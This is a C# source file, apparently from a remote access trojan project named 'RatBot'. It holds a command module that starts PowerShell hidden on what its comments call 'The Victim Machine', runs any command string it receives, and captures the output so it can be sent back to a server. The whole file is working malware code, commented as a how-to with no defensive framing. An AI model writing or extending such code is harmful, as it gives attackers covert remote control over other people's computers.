﻿using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace RatBot
{
    internal class cmds
    {

        public static string Run(string cmdToRun)
        {
            try
            {
                string retString = "";
				 // Making a New Object to Execute Our Commands
                Process processCmd = new Process();
				//Start Powershell on The Victim Machine
                processCmd.StartInfo.FileName = "powershell.exe"; 
                //--use /c as a cmd argument to close ps.exe once its finish processing your commands
                processCmd.StartInfo.Arguments = "/c " + cmdToRun;
				//https://docs.microsoft.com/en-us/dotnet/api/system.diagnostics.processstartinfo.useshellexecute?view=net-6.0
                processCmd.StartInfo.UseShellExecute = false;
				//https://docs.microsoft.com/en-us/dotnet/api/system.diagnostics.processstartinfo.createnowindow?view=net-6.0
				// Hides The Window of The Process
                processCmd.StartInfo.CreateNoWindow = true;
				//https://docs.microsoft.com/en-us/dotnet/api/system.diagnostics.processstartinfo.workingdirectory?view=net-6.0
                processCmd.StartInfo.WorkingDirectory = Environment.CurrentDirectory;
				//https://docs.microsoft.com/en-us/dotnet/api/system.diagnostics.processstartinfo.redirectstandardoutput?view=net-6.0
                processCmd.StartInfo.RedirectStandardOutput = true;
				//https://docs.microsoft.com/en-us/dotnet/api/system.diagnostics.processstartinfo.redirectstandarderror?view=net-6.0
                processCmd.StartInfo.RedirectStandardError = true;
				//Start The Process
                processCmd.Start();
				//Sends The Output to Server
                retString += processCmd.StandardOutput.ReadToEnd();
                retString += processCmd.StandardError.ReadToEnd();

                return retString;
            }
			// Used for Error Handling 
            catch (Exception ex)
            {
                return ex.Message.ToString() + Environment.NewLine;
            }

        }
    }


}

